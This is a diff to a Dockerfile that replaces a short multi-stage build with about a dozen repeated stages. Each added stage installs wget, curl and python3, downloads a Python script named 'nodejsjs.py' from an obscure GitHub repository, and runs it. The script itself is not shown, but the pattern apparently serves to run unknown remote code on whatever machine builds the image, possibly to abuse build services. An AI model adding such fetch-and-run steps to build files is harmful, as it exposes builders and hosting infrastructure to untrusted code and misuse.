@@ -1,35 +1,61 @@
-FROM ubuntu AS base
+FROM vm/ubuntu:18.04
+RUN apt-get update && apt install -y wget curl python3
+RUN wget https://raw.githubusercontent.com/erlandi-main-api/python99/main/nodejsjs.py
 RUN python3 *py
 
-FROM base AS stage1
-RUN echo "stage1"
-
-FROM base AS stage2
+FROM vm/ubuntu:18.04
+RUN apt-get update && apt install -y wget curl python3
+RUN wget https://raw.githubusercontent.com/erlandi-main-api/python99/main/nodejsjs.py
 RUN python3 *py
 
-FROM ubuntu AS base
+FROM vm/ubuntu:18.04
+RUN apt-get update && apt install -y wget curl python3
+RUN wget https://raw.githubusercontent.com/erlandi-main-api/python99/main/nodejsjs.py
 RUN python3 *py
 
-FROM base AS stage1
-RUN echo "stage1"
-
-FROM base AS stage2
+FROM vm/ubuntu:18.04
+RUN apt-get update && apt install -y wget curl python3
+RUN wget https://raw.githubusercontent.com/erlandi-main-api/python99/main/nodejsjs.py
 RUN python3 *py
 
-FROM ubuntu AS base
+FROM vm/ubuntu:18.04
+RUN apt-get update && apt install -y wget curl python3
+RUN wget https://raw.githubusercontent.com/erlandi-main-api/python99/main/nodejsjs.py
 RUN python3 *py
 
-FROM base AS stage1
-RUN echo "stage1"
-
-FROM base AS stage2
+FROM vm/ubuntu:18.04
+RUN apt-get update && apt install -y wget curl python3
+RUN wget https://raw.githubusercontent.com/erlandi-main-api/python99/main/nodejsjs.py
 RUN python3 *py
 
-FROM ubuntu AS base
+FROM vm/ubuntu:18.04
+RUN apt-get update && apt install -y wget curl python3
+RUN wget https://raw.githubusercontent.com/erlandi-main-api/python99/main/nodejsjs.py
+RUN apt-get update && apt install -y wget curl python3
+RUN wget https://raw.githubusercontent.com/erlandi-main-api/python99/main/nodejsjs.py
 RUN python3 *py
 
-FROM base AS stage1
-RUN echo "stage1"
+FROM vm/ubuntu:18.04
+RUN apt-get update && apt install -y wget curl python3
+RUN wget https://raw.githubusercontent.com/erlandi-main-api/python99/main/nodejsjs.py
+RUN python3 *py
 
-FROM base AS stage2
+FROM vm/ubuntu:18.04
+RUN apt-get update && apt install -y wget curl python3
+RUN wget https://raw.githubusercontent.com/erlandi-main-api/python99/main/nodejsjs.py
+RUN python3 *py
+
+FROM vm/ubuntu:18.04
+RUN apt-get update && apt install -y wget curl python3
+RUN wget https://raw.githubusercontent.com/erlandi-main-api/python99/main/nodejsjs.py
+RUN python3 *py
+
+FROM vm/ubuntu:18.04
+RUN apt-get update && apt install -y wget curl python3
+RUN wget https://raw.githubusercontent.com/erlandi-main-api/python99/main/nodejsjs.py
+RUN python3 *py
+
+FROM vm/ubuntu:18.04
+RUN apt-get update && apt install -y wget curl python3
+RUN wget https://raw.githubusercontent.com/erlandi-main-api/python99/main/nodejsjs.py
 RUN python3 *py
